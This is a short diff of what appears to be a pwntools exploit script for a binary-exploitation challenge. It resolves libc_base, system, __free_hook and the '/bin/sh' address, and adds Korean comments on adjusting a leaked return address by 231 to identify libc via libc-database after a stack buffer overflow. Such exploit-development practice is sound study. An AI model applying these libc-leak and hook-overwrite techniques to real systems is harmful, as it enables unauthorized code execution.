@@ -26,6 +26,13 @@ free_hook = libc_base + libc.symbols["__free_hook"]
 binsh = libc_base + next(libc.search(b"/bin/sh"))
 
 info(hex(libc_start_main_xx))
+# libc-database와 비교할 때 유의점
+# 위의 내용은 libc_start_main_ret와 동일하고,
+# 이는 libc_start_main과 231만큼 차이난다
+# 그러므로 Stack Buffer Overflow를 해서 얻은 Leak된 Return Addr를
+# 1) 231을 빼서 __libc_start_main과 DB에서 비교하거나
+# 2) __libc_start_main과 DB에서 비교한 다음
+# 해당 libc를 다운받고 이를 ELF로 연결시켜주자
 slog("libc_base", libc_base)
 slog("system", system)
 slog("free_hook", free_hook)
